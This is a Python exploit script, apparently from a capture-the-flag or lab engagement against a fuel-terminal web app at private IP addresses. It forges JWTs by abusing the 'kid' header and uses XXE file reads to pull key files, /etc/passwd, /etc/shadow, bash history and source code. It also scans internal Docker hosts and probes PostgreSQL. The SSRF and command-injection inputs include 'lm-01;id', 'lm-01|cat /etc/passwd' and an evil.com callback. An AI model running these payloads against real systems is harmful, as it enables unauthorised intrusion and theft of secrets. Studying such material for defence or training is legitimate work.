#!/usr/bin/env python3
"""round68 — Read /app/keys/probe + static JS + mystery container 172.18.0.4 + DB oracle"""
import requests, json, time, hashlib, hmac as hm, base64, socket

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)

# Helper to extract field value from JSON response
def extract_xxe(path, field="remarks"):
    code, text = xxe_read(path, field)
    if code == 200:
        try:
            data = json.loads(text)
            val = data.get("ticket", {}).get(field, "")
            return code, val
        except:
            return code, text
    return code, text

# ============================================================
print("="*70)
print("PHASE 1: READ /app/keys/probe AND VARIANTS")
print("="*70)
print("  Key directory has 'carrier' and 'operator' — is there 'probe'?")

key_paths = [
    # Direct key files
    "/app/keys/probe",
    "/app/keys/probe_secret",
    "/app/keys/hmac",
    "/app/keys/signing",
    "/app/keys/secret",
    "/app/keys/default",
    "/app/keys/master",
    "/app/keys/api",
    "/app/keys/gauge",
    "/app/keys/admin",
    # Different extensions
    "/app/keys/probe.key",
    "/app/keys/probe.pem",
    "/app/keys/probe.txt",
    "/app/keys/hmac.key",
    "/app/keys/secret.key",
    # Possible config files
    "/app/probe_secret",
    "/app/probe.key",
    "/app/.probe_secret",
    "/app/.secret",
    "/app/.env.local",
    "/app/.env.production",
    "/app/config/probe",
    "/app/config/secrets",
    "/app/config/hmac",
    "/app/secrets/probe",
    # System secrets
    "/etc/probe_secret",
    "/etc/secrets/probe",
    "/run/secrets/probe_secret",
    "/run/secrets/probe",
    "/run/secrets/hmac_key",
    "/var/run/secrets/probe_secret",
]

for path in key_paths:
    code, val = extract_xxe(path)
    if code == 200 and val and len(val) > 0:
        print(f"  *** READABLE: {path} ({len(val)} bytes) ***")
        print(f"  *** CONTENT: {val!r} ***")
        # If we found the key, verify it against known probe signature
        KNOWN_URL = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
        KNOWN_SIG = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")
        for k in [val.encode(), val.strip().encode(), val.encode('utf-8')]:
            if hm.new(k, KNOWN_URL, hashlib.sha256).digest() == KNOWN_SIG:
                print(f"  *** !!! PROBE_SECRET FOUND: {val!r} !!! ***")
    elif code == 400:
        print(f"  EXISTS (binary/special chars): {path}")
    elif code == 200:
        pass  # Empty = doesn't exist
    else:
        print(f"  [{code}] {path}: {val[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: READ STATIC JS FILES")
print("="*70)
print("  Looking for JavaScript that might reference API endpoints or secrets")

js_paths = [
    "/app/static/js/app.js",
    "/app/static/js/main.js",
    "/app/static/js/script.js",
    "/app/static/js/index.js",
    "/app/static/js/portal.js",
    "/app/static/js/probe.js",
    "/app/static/js/api.js",
    "/app/static/js/auth.js",
    "/app/static/js/custody.js",
    "/app/static/js/gauge.js",
    "/app/static/app.js",
    "/app/static/main.js",
    "/app/static/script.js",
    # Bundled JS
    "/app/static/js/bundle.js",
    "/app/static/js/vendor.js",
    "/app/static/dist/main.js",
    "/app/static/dist/bundle.js",
    # Common paths
    "/app/static/favicon.ico",
    "/app/static/robots.txt",
]

for path in js_paths:
    code, val = extract_xxe(path)
    if code == 200 and val and len(val) > 0:
        print(f"  *** FOUND JS: {path} ({len(val)} bytes) ***")
        print(f"  Content (first 500 chars):")
        print(f"    {val[:500]}")
    elif code == 400:
        print(f"  EXISTS (has <): {path}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: READ MORE /proc FILES")
print("="*70)

proc_paths = [
    # Readable /proc files that might have useful info
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/proc/self/status",
    "/proc/self/limits",
    "/proc/self/io",
    "/proc/self/stat",
    "/proc/self/statm",
    "/proc/self/oom_score",
    "/proc/self/oom_score_adj",
    "/proc/self/net/route",
    "/proc/self/net/dev",
    "/proc/self/net/if_inet6",
    "/proc/self/net/fib_trie",
    "/proc/self/net/unix",
    "/proc/version",
    "/proc/hostname",    # not standard but try
    "/etc/hostname",
    "/etc/hosts",
    "/etc/resolv.conf",
    "/etc/passwd",
    "/etc/shadow",       # usually unreadable
    "/etc/environment",
    "/root/.bashrc",
    "/root/.profile",
    "/root/.bash_history",
    # Docker files
    "/.dockerenv",
    "/proc/1/cgroup",
]

for path in proc_paths:
    code, val = extract_xxe(path)
    if code == 200 and val and len(val) > 0:
        lines = val.split('\n')
        print(f"  {path} ({len(val)} bytes, {len(lines)} lines):")
        for line in lines[:15]:
            print(f"    {line}")
        if len(lines) > 15:
            print(f"    ... ({len(lines)-15} more lines)")
    elif code == 400:
        print(f"  EXISTS (special chars): {path}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: MYSTERY CONTAINER 172.18.0.4 — TRY FROM KALI")
print("="*70)
print("  172.18.0.4 is in the ARP table — might be routed from VPN?")

# First try to connect directly (Docker internal network likely not routed)
target = "172.18.0.4"
ports_to_try = [22, 80, 443, 3000, 5000, 5432, 6379, 8000, 8007, 8080,
                9000, 9001, 9100, 9200, 27017]

for port in ports_to_try:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"  *** OPEN: {target}:{port} ***")
            try:
                r = requests.get(f"http://{target}:{port}/", timeout=3)
                print(f"    HTTP [{r.status_code}]: {r.text[:300]}")
            except:
                pass
        sock.close()
    except:
        pass

# Also try the Docker gateway
target2 = "172.18.0.1"
print(f"\n  Testing Docker gateway {target2}...")
for port in [80, 443, 8007, 9000, 9100]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target2, port))
        if result == 0:
            print(f"  *** OPEN: {target2}:{port} ***")
        sock.close()
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: KID ORACLE — VERIFY DATABASE_URL CANDIDATES")
print("="*70)
print("  Testing known DATABASE_URL patterns via kid=/proc/self/environ")
print("  approach: build partial environ, test via kid oracle")
print()
print("  Actually — testing kid=/app/db.py with MODIFIED content")
print("  We know db.py content. If the server reads db.py, we can verify")
print("  that our copy is exact. Already confirmed in round65!")
print()
print("  Instead: try kid with specific SECRET files...")

# We know kid reads a file and uses it as HMAC key for JWT verification.
# If we set kid=/app/keys/probe and we KNOW the file content,
# we can forge a valid JWT.
# But we DON'T know the file content...
# Unless the file is one we've already read!
#
# What if kid=/app/static/css/app.css? We have the CSS content.
# Let's verify our copy is correct (confirms the oracle still works).

# Read app.css via XXE to get current content
print("  Verifying kid oracle still works with app.css...")
code, css_content = extract_xxe("/app/static/css/app.css")
if code == 200 and css_content:
    # Try with trailing newline (like db.py needed)
    for suffix in ['', '\n']:
        key = (css_content + suffix).encode('utf-8')
        token = jwt_forged(role="operator", kid="/app/static/css/app.css", key=key)
        try:
            r = S.get(f"{CASPI}/api/auth/me",
                     headers={"Authorization": f"Bearer {token}"}, timeout=5)
            print(f"  kid=/app/static/css/app.css (newline={bool(suffix)}): {r.status_code}")
            if r.status_code == 200:
                print(f"  *** ORACLE CONFIRMED with CSS ***")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: READ PYTHON SOURCE FILES WE MIGHT HAVE MISSED")
print("="*70)

py_paths = [
    "/app/probe.py",
    "/app/probes.py",
    "/app/ops.py",
    "/app/operations.py",
    "/app/routes.py",
    "/app/views.py",
    "/app/api.py",
    "/app/models.py",
    "/app/utils.py",
    "/app/helpers.py",
    "/app/config.py",
    "/app/settings.py",
    "/app/constants.py",
    "/app/custody.py",
    "/app/gauge.py",
    "/app/signing.py",
    "/app/hmac_utils.py",
    "/app/crypto.py",
    "/app/secret.py",
    "/app/middleware.py",
    "/app/blueprints.py",
    "/app/__init__.py",
    "/app/wsgi.py",
    # Subdirectories
    "/app/api/__init__.py",
    "/app/api/probe.py",
    "/app/api/ops.py",
    "/app/api/custody.py",
    "/app/api/auth.py",
    "/app/routes/__init__.py",
    "/app/routes/probe.py",
    "/app/routes/ops.py",
    "/app/blueprints/__init__.py",
    "/app/blueprints/ops.py",
]

for path in py_paths:
    code, val = extract_xxe(path)
    if code == 200 and val and len(val) > 0:
        print(f"  *** FOUND: {path} ({len(val)} bytes) ***")
        print(f"  Content:")
        for line in val.split('\n')[:30]:
            print(f"    {line}")
    elif code == 400:
        print(f"  EXISTS (has < or &): {path}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: TRY READ /etc/hosts FOR INTERNAL DNS")
print("="*70)
print("  Already tried above, but check specifically for gauge-gw")

code, hosts = extract_xxe("/etc/hosts")
if code == 200 and hosts:
    print(f"  /etc/hosts ({len(hosts)} bytes):")
    for line in hosts.split('\n'):
        print(f"    {line}")
        if 'gauge' in line.lower() or '172.18.0.4' in line:
            print(f"    *** INTERESTING: {line} ***")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: CHECK POSTGRES ON .102")
print("="*70)

# Is PostgreSQL port exposed to VPN?
for port in [5432, 5433, 5434, 15432]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex(("192.168.242.102", port))
        if result == 0:
            print(f"  *** POSTGRES PORT OPEN: 192.168.242.102:{port} ***")
            # Try to get banner
            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock2.settimeout(3)
            sock2.connect(("192.168.242.102", port))
            sock2.send(b"\x00\x00\x00\x08\x04\xd2\x16\x2f")  # PostgreSQL SSLRequest
            data = sock2.recv(100)
            print(f"    Banner: {data!r}")
            sock2.close()
        sock.close()
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: CREATIVE — USE PROBE SSRF WITH EXISTING SIGS")
print("="*70)
print("  We have 5 signed URLs. Can we modify the path component?")
print("  The server likely checks: url == registered_url")
print("  But what if it only checks the signature match?")

# URL we have: http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow
# Sig: 5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09
#
# If the server does: verify(PROBE_SECRET, url, sig) → ok → requests.get(url)
# Then we need valid sig for our URL.
#
# BUT: what if there's a different endpoint that accepts URL+sig differently?
# Or what if we can inject into the URL via the device parameter?

# Try: what if device parameter is injectable?
injections = [
    "lm-01",  # Normal
    "../../../etc/hosts",  # Path traversal
    "lm-01;id",  # Command injection
    "lm-01|cat /etc/passwd",
    "lm-01\nX-Custom: test",  # Header injection
    "lm-01%00extra",  # Null byte
    "http://evil.com",  # Full URL
    "lm-01?callback=http://evil.com",  # Parameter injection
    "tk-01/../../admin",  # Path traversal in URL
    "lm-01 --header 'X: Y'",  # Curl injection
]

for device in injections:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign", params={"device": device},
                 headers=AUTH_OP, timeout=5)
        print(f"  device={device!r}: [{r.status_code}] {r.text[:200]}")
    except:
        pass

# Try POST to probe endpoint with manipulated data
# Normal probe: POST /api/ops/probe {"url": "...", "sig": "..."}
# What if we add extra fields?

probe_data = {
    "url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
    "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
}

# Normal request
try:
    r = S.post(f"{CASPI}/api/ops/probe", json=probe_data, headers=AUTH_OP, timeout=5)
    print(f"\n  Normal probe: [{r.status_code}] {r.text[:300]}")
except Exception as e:
    print(f"  Normal probe error: {e}")

# With extra fields
extras = [
    {"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09",
     "target": "http://172.18.0.4:80/"},
    {"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09",
     "follow_redirects": True},
    {"url": "http://172.18.0.4/",
     "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"},
]

for extra in extras:
    try:
        r = S.post(f"{CASPI}/api/ops/probe", json=extra, headers=AUTH_OP, timeout=5)
        print(f"  Probe {json.dumps(extra)[:100]}: [{r.status_code}] {r.text[:200]}")
    except:
        pass

# Try GET with query params
try:
    r = S.get(f"{CASPI}/api/ops/probe",
             params={"url": probe_data["url"], "sig": probe_data["sig"]},
             headers=AUTH_OP, timeout=5)
    print(f"\n  GET probe: [{r.status_code}] {r.text[:300]}")
except:
    pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 10: WEB ENDPOINTS — GET HTML PAGES FOR CLUES")
print("="*70)

# Fetch HTML pages to find JS includes and hidden endpoints
pages = ["/", "/login", "/register", "/portal",
         "/portal/", "/dashboard", "/admin",
         "/api", "/api/", "/api/v1",
         "/api/docs", "/api/swagger",
         "/healthz", "/health", "/status",
         "/flag", "/llehs", "/shell",
         # Flask auto-routes
         "/static/", "/site-map", "/routes"]

for path in pages:
    try:
        r = S.get(f"{CASPI}{path}", timeout=5, allow_redirects=False)
        if r.status_code in [200, 301, 302, 303, 307, 308]:
            # Look for script tags, interesting links
            text = r.text[:2000]
            print(f"\n  [{r.status_code}] GET {path}:")
            if 'Location' in r.headers:
                print(f"    Redirect: {r.headers['Location']}")
            # Find script/link tags
            import re
            scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', text)
            links = re.findall(r'<link[^>]*href=["\']([^"\']+)["\']', text)
            a_hrefs = re.findall(r'<a[^>]*href=["\']([^"\']+)["\']', text)
            forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', text)
            if scripts: print(f"    Scripts: {scripts}")
            if links: print(f"    Links: {links}")
            if a_hrefs: print(f"    Anchors: {a_hrefs}")
            if forms: print(f"    Forms: {forms}")
            # Show first 500 chars for important pages
            if path in ["/", "/portal", "/portal/"]:
                print(f"    Body: {text[:500]}")
    except:
        pass

# Try with auth
for path in ["/portal", "/portal/", "/dashboard", "/admin"]:
    try:
        # Use registered account JWT
        r = S.get(f"{CASPI}{path}",
                 headers=AUTH_OP, timeout=5, allow_redirects=False)
        if r.status_code in [200, 301, 302]:
            print(f"\n  [{r.status_code}] GET {path} (as operator):")
            text = r.text[:1000]
            import re
            scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', text)
            if scripts: print(f"    Scripts: {scripts}")
            print(f"    Body: {text[:500]}")
    except:
        pass

print("\n"+"="*70)
print("DONE")
print("="*70)
